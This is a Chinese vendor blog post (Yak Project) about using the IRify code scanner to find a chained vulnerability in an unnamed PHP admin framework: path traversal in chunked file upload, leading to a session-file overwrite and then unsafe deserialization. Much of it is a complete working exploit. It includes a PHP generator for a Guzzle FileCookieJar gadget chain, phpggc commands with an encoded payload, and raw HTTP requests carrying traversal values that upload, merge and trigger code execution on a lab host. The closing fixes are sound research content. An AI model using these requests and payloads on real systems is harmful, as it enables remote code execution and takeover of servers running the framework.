> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk0MTM4NzIxMQ==&mid=2247528323&idx=1&sn=4c2813169468c082a4f51eb8eb6f1c54

#  用 IRify 定位某 Admin 目录遍历及反序列化漏洞文件上传  
原创 YAK  Yak Project   2025-06-20 09:19  
  
#   
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZfCSs0zKcMmDXyJt76PDpGiataSbajd3BpbZnPXBCqFaA3icu2mY1LGqAmJHIiaCq5N9qCBv47ktQEYA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpiaWCicPsMEjINYFibjicGYU1WgiaTibAbwUlIPwu8nApytYghVl1icLjAomiaQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpsmx5Xfrc4ySECIWyFiafjZrZvloOWCMAMD2l5lk4La6AbaJicdGFd5Ow/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpOMAgjU6FicCmYIUzhWRO8GOsYQaTRFcckLpVS56HHYeZHzlSFh1NQng/640?wx_fmt=jpeg "")  
  
本漏洞是某 Admin 框架中存在的一个严重安全隐患，涉  
及**文件上传**  
功能的目录穿越漏洞与**反****序列****化**  
漏洞链。攻击者可以利用这一漏洞链上传 
```
PHP
```

  
 文件，从而完全控制受影响的服务器系统。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGp7wdqzybrQvxffee5DFIErmF72DGqoMvFSSXPAY9np9dlaficmc3Zc4A/640?wx_fmt=png&from=appmsg "")  
  
  
使用 IRify 内置 PHP 规则，对某 Admin 源码进行扫描，结果如下图：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpVia69jeBUy6BJG0aew4L4ciat46u2TYiaqliaIrhbJYlZ0M6sDaAH4rYNQ/640?wx_fmt=png&from=appmsg "")  
  
从扫描结果的第一印象就发现了很多**过滤不严格的审计结果**  
，  
点击审计详情后，多个 
```
source 
```

  
指向了 
```
Upload.php 
```

  
文件：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpNTOa5V3QkL61hBgiciazkAmJvLXxQcXLpeEXAlcUacUat6pya0iaya9ibA/640?wx_fmt=png&from=appmsg "")  
  
我们尝试写一个简单的 SyntaxFlow 规则来尝试找到入口为 HTTP 请求相关的，过滤不严格的：  

```
request().* as $source 
.move?(* #{
    include: <<<CODE
* & $source
CODE
}->) as $sink
```

  
这个规则的含义是：  
  
定义污染源（ Source ）：request().* as $source 将所有 HTTP 请求输入（包括 GET、POST 参数、文件上传等）标记为污染源，并命名为 $source。这是数据流分析的起点，  
代表着所有可能被攻击者控制的输入。  
  
追踪数据流传播：.move?(* #{ ... }->) 表示追踪污染数据在程序执行路径中的流动。其中 * 表示可以通过任意中间变量、函数调用或数据转换，只要数据流保持连贯性。  
  
执行审计，如下图：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpialOIleqQl35eUO809WYjSBZrEWyvdzT3icBlpG9HffeyPzLuvs0EczQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGprDqvctqibURRL5CtCQAUN6Av9AuRpUiciaSZgVVibzibX0rRn0Cd7vJNibEQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞入口点位于应用的文件上传功能中，  
  
具体位于 
```
app/index/controller/User.php
```

  
 的 
```
upload
```

  
 方法：  

```
/**
 * 文件上传函数
 */
public function upload(): Response
{
    if (request()->isPost()) {
        $response = Upload::instance()->upload();
        if (empty($response)) {
            return $this->error(Upload::instance()->getError());
        }
        return json($response);
    }
    return json(ResultCode::SUCCESS);
}
```

  
这个方法接收用户的 POST 请求，并将处理逻辑委托给 
```
Upload
```

  
 类的 
```
upload 
```

  
方法。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpDUwSUcia108aH21aNzaAFFd2WGicTzlqPJcpc2GL2rdEhITCscx7J9AQ/640?wx_fmt=png&from=appmsg "")  
  
在 
```
Upload.php
```

  
的 
```
upload()
```

  
 方法中存在不安全的参数处理：  

```
public function upload()
{
    $param = request()->all();
    $action = input('action');
    $file = request()->file('file');
    // ... 省略部分代码 ...
    if ($action == 'marge') {
        return $this->multiMarge($param);
    } else if (isset($param['chunkId']) && $param['chunkId']) {
        return $this->multiPartUpload($file, $param);
    }


    // ... 省略部分代码 ...
}
```

  
这里根据请求参数中的
```
action
```

  
 和
```
chunkId
```

  
 来决定处理方式，其中 
```
multiPartUpload
```

  
 方法  
包含了漏洞点。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpDBqTZ8Ecx93Ivc2I9r0OeLCWQp8qNNKRmvmXb8j97YqgYOEXguIQCg/640?wx_fmt=png&from=appmsg "")  
  
  
在 
```
multiPartUpload
```

  
 方法中存在严重的安全问题：  

```
public function multiPartUpload(object $file, array $params = [])
{
    $index = $params['index'];
    $chunkId = $params['chunkId'];
    $chunkName = $chunkId . '_' . $index . '.part';
    // 校验分片名称 - 这里的验证存在问题
    if (!preg_match('/^[0-9\-]/', $chunkId)) {
        $this->setError('文件信息错误');
        return false;
    }
    $this->getFileSavePath($file);
    $chunkSavePath = root_path('runtime/chunks');
    $this->resource = $chunkSavePath . $chunkName;
    if (!$file->move($this->resource)) {
        $this->setError('请检查服务器读写权限！');
        return false;
    }


    // ... 省略部分代码 ...
}
```

- **不安全的正则表达****式验证**  
：****  
  
  

```
if (!preg_match('/^[0-9\-]/', $chunkId)) {
   $this->setError('文件信息错误');
   return false;
}
```

  
这个正则表达式只验证 
```
$chunkId
```

  
 的**第一个字符**  
是否为数字或破折号，而没有验证整个字符串。这使得我们可以构造如：1/../../sessions/session_xxx  
 这样的路径，从而实现目录穿越。  
  
- **路径拼接没有安全处理**  
：  
  

```
$chunkName = $chunkId . '_' . $index . '.part';
$this->resource = $chunkSavePath . $chunkName;
```

  
直接将用户可控的 
```
$chunkId 
```

  
拼接到文件路径中，没有进行任何路径规范化或安全检查。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpWAenKKq6eotbArFo1lFS08OMVsQ21uJdicwWticJib3Q2ow54RRJGzBow/640?wx_fmt=png&from=appmsg "")  
  
  
在 
```
config/session.php
```

  
 中，配置了会话文件的存储位置：  

```
'file' => [
    'save_path' => runtime_path() . '/sessions',
],
```

  
通过查阅资料发现，workerman **会话处理**  
流程  
解析如下：  
- 采用文件方式存储会话数据  
  
- 当系统启动时，会根据 
```
config/session.php
```

  
 中的配置选择会话处理器  
  
- 由于配置中指定了 
```
file
```

  
 类型的存储，系统会初始化 `FileSessionHandler` 作为会话处理器  
  
- 会话文件存储在 
```
runtime/sessions
```

  
 目录下，格式为 `session_[会话ID]`  
  
- 当用户请求包含 SESSION_ID 时，系统会尝试从该路径加载对应的会话文件  
  
在 
```
FileSessionHandler.php
```

  
 中，  
会话文件的读取逻辑如下：  

```
public function read(string $sessionId): string|false
{
    $sessionFile = static::sessionFile($sessionId);
    clearstatcache();
    if (is_file($sessionFile)) {
        if (time() - filemtime($sessionFile) > Session::$lifetime) {
            unlink($sessionFile);
            return false;
        }
        $data = file_get_contents($sessionFile);
        return $data ?: false;
    }
    return false;
}
```

  
当系统需要读取会话数据时，它会调用 
```
FileSessionHandler
```

  
 的 
```
read
```

  
 方法，该方法会  
根据会话 ID 构建文件路径，  
然后读取文件内容。这个文件内容随后会被传递给 
```
Session 
```

  
类进行处理。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpPo5CnOTSDL1qmywcgdmhicOO4PF5CAicypnFtsibeticFFqbagwcnHuzibQ/640?wx_fmt=png&from=appmsg "")  
  
在 
```
Session.php
```

  
 的构造函数中存在不安全的反序列化操作：  

```
public function __construct(string $sessionId)
{
    if (static::$handler === null) {
        static::initHandler();
    }
    $this->sessionId = $sessionId;
    if ($data = static::$handler->read($sessionId)) {
        $this->data = unserialize($data);  // 这里进行了不安全的反序列化操作
    }
}
```

  
当读取会话数据后，直接对其进行反序列化，而没有进行任何类型检查或过滤。如果攻击者能够控制会话文件的内容，就可以  
通过反序列化漏洞执行任意代码。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGp55ia5wESAFd729XqWbeFbkEOwyk5nq90L3W4WsTabus8NWRDhVrWVicQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpVUics96peEYI4bRBpjpYSiccfesia89AuYVibnSG6Ziazgmic9HUibvofxrxA/640?wx_fmt=png&from=appmsg "")  
  
通过前面的分析利用此漏洞的完整流程如下：  
  
**（1）构造请求 1**  
：  
通过分片上传功能，利用目录穿越漏洞覆盖会话文件，内容为恶意的序列化数据  
  
**（2）构造请求 2**  
：  
发送  
合并(**action**  
为**marge**  
)  
请求  
触发文件的实际写入  
  
**（3）触发反****序列化**  
：  
设置 SESSION_ID 为前两步上传的恶意 Seesion，请求任意页面加载会话  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGphJbHuFS1hniaTExib00grQHkdibpmP7nm9FFBlGkMHCX8TJQYmymCib6tg/640?wx_fmt=png&from=appmsg "")  
  
通过上面的分析，我们知道了漏洞的入口点为 Admin 后台上传处，某 Admin 允许自主注册，因此我们  
先注册一个用户：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpUrgXJ3j4juJ4D7K2trVXghpYgZicPdqgoJsibIyhGFmmuOnoBeDOz2Rw/640?wx_fmt=png&from=appmsg "")  
  
登录后，意外地没有找到上传的界面，但是通过代码我们可以知道，这就是一个很标准的文件上传操作，可以直接通过 WebFuzzer 进行构造，在此之前我们需要构造 序列化的 Payload，随后直接通过构造裸 HTTP 包进行文件上传。  
  
### 步骤一：序列化 Payload 构造  
  
本框架中使用了Guzzle，我们使用的Payload 是一个经过序列化的 
```
GuzzleHttp\Cookie\FileCookieJar
```

  
 对象。  
  
这个类在执行 
```
__destruct
```

  
 方法时会将 Cookie 写入到指定文件。  

```
<?php
// 生成GuzzleHttp\Cookie\FileCookieJar序列化Payload的PHP代码
function generateFileCookieJarPayload($phpCode = '<?php phpinfo();?>', $filename = 'ttest.php')
{
    // 手动构造序列化数据
    $setCookieData = [
        'Name' => 'aaa',
        'Value' => $phpCode,
        'Domain' => 'testDomain',
        'Path' => '/',
        'Max-Age' => null,
        'Expires' => null,
        'Secure' => false,
        'Discard' => false,
        'HttpOnly' => false
    ];


    // 构造SetCookie序列化字符串
    $setCookie = 'O:27:&#34;GuzzleHttp\\Cookie\\SetCookie&#34;:1:{';
    $setCookie .= 's:33:&#34;' . &#34;\0&#34; . 'GuzzleHttp\\Cookie\\SetCookie' . &#34;\0&#34; . 'data&#34;;';
    $setCookie .= 'a:9:{';


    foreach ($setCookieData as $key => $value) {
        $setCookie .= 's:' . strlen($key) . ':&#34;' . $key . '&#34;;';


        if ($value === null) {
            $setCookie .= 'N;';
        } elseif (is_bool($value)) {
            $setCookie .= 'b:' . ($value ? '1' : '0') . ';';
        } else {
            $setCookie .= 's:' . strlen($value) . ':&#34;' . $value . '&#34;;';
        }
    }


    $setCookie .= '}}';


    // 构造FileCookieJar序列化字符串
    $fileCookieJar = 'O:31:&#34;GuzzleHttp\\Cookie\\FileCookieJar&#34;:4:{';
    // cookies属性
    $fileCookieJar .= 's:36:&#34;' . &#34;\0&#34; . 'GuzzleHttp\\Cookie\\CookieJar' . &#34;\0&#34; . 'cookies&#34;;';
    $fileCookieJar .= 'a:1:{i:1;' . $setCookie . '}';


    // strictMode属性
    $fileCookieJar .= 's:39:&#34;' . &#34;\0&#34; . 'GuzzleHttp\\Cookie\\CookieJar' . &#34;\0&#34; . 'strictMode&#34;;';
    $fileCookieJar .= 'b:0;';


    // filename属性
    $fileCookieJar .= 's:41:&#34;' . &#34;\0&#34; . 'GuzzleHttp\\Cookie\\FileCookieJar' . &#34;\0&#34; . 'filename&#34;;';
    $fileCookieJar .= 's:' . strlen($filename) . ':&#34;' . $filename . '&#34;;';


    // storeSessionCookies属性
    $fileCookieJar .= 's:52:&#34;' . &#34;\0&#34; . 'GuzzleHttp\\Cookie\\FileCookieJar' . &#34;\0&#34; . 'storeSessionCookies&#34;;';
    $fileCookieJar .= 'b:1;}';


    return $fileCookieJar;
}
```

  
或者直接使用 
```
phpggc 
```

  
快速生成：  

```
./phpggc -l | grep guzzle
Guzzle/FW1       4.0.0-rc.2 <= 7.5.0+       File write            __destruct
```

  
通过参数可知本条 
```
gadget chain 
```

  
合适。  
  
（1）类型是文件写入(File write)  
  
（2）触发向量是__destruct方法  
  
（3）版本兼容范围广(4.0.0-rc.2 到 7.5.0+)，覆盖了本框架中使用的 Guzzle 版本  

```
php ./phpggc Guzzle/FW1 ttest.php .\phpinfo.php -u
O%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A21%3A%22%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%0D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A9%3A%22ttest.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7D
```

  
这个 payload 利用了 PHP 的对象序列化机制，当反序列化 
```
FileCookieJar
```

  
 对象时，对象的 
```
__destruct
```

  
 方法会被调用，进而触发文件写入操作，将恶意 PHP 代码写入到服务器上的某个位置。  
### 步骤二：构造恶意请求，覆盖会话文件  
  
攻  
击者发送包含目录穿越的分片上传请  
求：  

```
POST /index/user/upload?chunkId=1/../../sessions/session_tXEWsmpuZEoZqJqMmSgqUYUFZzMwuRvL&index=1&fileExt=jpg HTTP/1.1
Host: 192.168.3.3:8787
Cookie: SESSION_ID=bbd4d396f614da41a0cb74da972ff844; uid=2; token=250e4ef8162d56748202c5ad95f1058c; nickname=go0p
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGm1kPOLTg3kmc3MF
Content-Length: 733
------WebKitFormBoundaryGm1kPOLTg3kmc3MF
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;1.&#34;
Content-Type: image/jpeg
{{urldec(O%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A1%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A9%3A%7Bs%3A4%3A%22Name%22%3Bs%3A3%3A%22aaa%22%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%5C%3C%3Fphp+phpinfo%28%29%3B%3F%3E%22%3Bs%3A6%3A%22Domain%22%3Bs%3A10%3A%22testDomain%22%3Bs%3A4%3A%22Path%22%3Bs%3A1%3A%22%2F%22%3Bs%3A7%3A%22Max-Age%22%3BN%3Bs%3A7%3A%22Expires%22%3BN%3Bs%3A6%3A%22Secure%22%3Bb%3A0%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A8%3A%22HttpOnly%22%3Bb%3A0%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3Bb%3A0%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A9%3A%22ttest.php%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7D)}}
------WebKitFormBoundaryGm1kPOLTg3kmc3MF--
返回包 body 如下
{
  &#34;code&#34;: 200,
  &#34;msg&#34;: &#34;分片上传成功&#34;,
  &#34;url&#34;: &#34;&#34;,
  &#34;chunkId&#34;: &#34;1/../../sessions/session_tXEWsmpuZEoZqJqMmSgqUYUFZzMwuRvL&#34;,
  &#34;index&#34;: 1
}
```

  
这里的关键是 **chunkId**  
 参数值为：  
  
 
```
1/../../sessions/session_tXEWsmpuZEoZqJqMmSgqUYUFZzMwuRvL
```

  
，这构成了一个目录穿越路径，指向会话文件。  
  
 上传的内容是一个经过序列化的 **GuzzleHttp\Cookie\FileCookieJar**  
 对象，包含了要执行的 PHP 代码。由于正则表达式 
```
/^[0-9\-]/
```

  
 只检查第一个字符，而 
```
1
```

  
 符合这个要求，所以这个请求能够通过验证。  
  
### 步骤三：发送合并请求，触发文件写入  

```
POST /index/user/upload?action=marge&chunkId=-/../../sessions/session_tXEWsmpuZEoZqJqMmSgqUYUFZzMwuRvL&fileExt=jpg&mimeType=image/jpeg&chunkCount=2&fileSize=500&source=1 HTTP/1.1
Host: 192.168.3.3:8787
Cookie: SESSION_ID=bbd4d396f614da41a0cb74da972ff844; uid=2; token=250e4ef8162d56748202c5ad95f1058c; nickname=go0p
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://127.0.0.1:8093
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGm1kPOLTg3kmc3MF
Content-Length: 176
------WebKitFormBoundaryGm1kPOLTg3kmc3MF
Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;1.&#34;
Content-Type: image/jpeg
------WebKitFormBoundaryGm1kPOLTg3kmc3MF--
```

  
这个请求通过 `action=marge` 参数触发合并操作，目标依然是前面的同一个会话文件。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpcpeibAfXMIV5WJG73cicuUoEQnqwJv3WQJiauZ9QicIYiasmuJtpXlXroPw/640?wx_fmt=png&from=appmsg "")  
  
### 步骤四：触发反序列化  
  
我们找到后台登录页面，用户名和密码随意输入，通过设置 SESSION_ID 为前两步的Seesion，点击登录：  

```
POST /admin/login/index HTTP/1.1
Origin: http://192.168.3.3:8787
Referer: http://192.168.3.3:8787/admin/login
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Cookie: SESSION_ID=tXEWsmpuZEoZqJqMmSgqUYUFZzMwuRvL; uid=2; token=250e4ef8162d56748202c5ad95f1058c; nickname=go0p
Host: 192.168.3.3:8787
Content-Length: 33
name=go0p&pwd=1231312313&captcha=
```

  
当服务器处理这个请求时，会尝试加载我们前面生成的恶意会话数据，并反序列化其中的内容，从而触发恶意代码执行。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpRmEKANGyrBuf9iap5pVULicNOk8ZUJysAYnQrScpDAHNN03zWlkHPRsg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcZEfibgt3AwvYxcwGUeXQGpeSrgzP5P1Tz5gs2G4DF2utGRX786zOZqUicM5WozkpDfOIjpJUcUJzw/640?wx_fmt=png&from=appmsg "")  
  
针对这个漏洞，可以采取以下  
防护措施：  
- 对文件路径进行严格的验证，不允许包含目录穿越字符：  
  
- 安全的反序列化，使用 PHP 7.0+ 提供的 `unserialize` 第二个参数，限制可反序列化的类：  
  

```
// 修改前（存在漏洞）
$this->data = unserialize($data);
// 修改后（安全）
$this->data = unserialize($data, ['allowed_classes' => false]);
```

- 路径规范化，在使用用户输入构建文件路径之前，进行路径规范化处理  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZccyPk1DjfibqXZaU61gfQHcqaeOQPbgslaRAibzjWjL0GettqyXuic7sWkEq5VXfFZS5VkLwxAuO9ZA/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
本次分析的某 Admin 框架漏洞是一个典型的  
安全验证不足  
导致的文件上传漏洞。攻击链包括：  
  
（1）利用目录穿越漏洞覆盖会话文件  
  
（2）利用 PHP 的反序列化机制执行恶意代码  
  
这类漏洞提醒我们：  
  
（1）对用户输入（特别是涉及文件路径的输入）进行严格验证是至关重要的  
  
（2）在处理反序列化数据时，应始终使用安全的方式，限制可反序列化的类  
  
（3）遵循最小权限原则，降低攻击造成的潜在危害  
  
（4）定期进行安全审计，及时发现并修复安全漏洞  
  
开发安全的 Web 应用程序需要  
持续关注安全最佳实践，  
尤其是在  
处理用户输入和执行潜在危险操作（如反序列化）  
时更应谨慎。  
  
  
  
**END**  
  
  
 **YAK官方资源**  
  
  
Yak 语言官方教程：  
  
https://yaklang.com/docs/intro/  
  
Yakit 视频教程：  
  
https://space.bilibili.com/437503777  
  
Github下载地址：  
  
https://github.com/yaklang/yakit  
  
Yakit官网下载地址：  
  
https://yaklang.com/  
  
Yakit安装文档：  
  
https://yaklang.com/products/download_and_install  
  
Yakit使用文档：  
  
https://yaklang.com/products/intro/  
  
常见问题速查：  
  
https://yaklang.com/products/FAQ  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcGEibOlRNlz6ZPic3cWicMDwdqZLq9q0hibDYiaICia6nncspoDTRnjPXFGTr3VWd9FlV4YSXRStoabxbg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZeX0EdicJxBOjGjQuecg0TvCvRgqibPwyOUp8untXs9Cl5XKux2yQQf27ibgZ0ic0Fm2yicdbYg6c4xUJg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
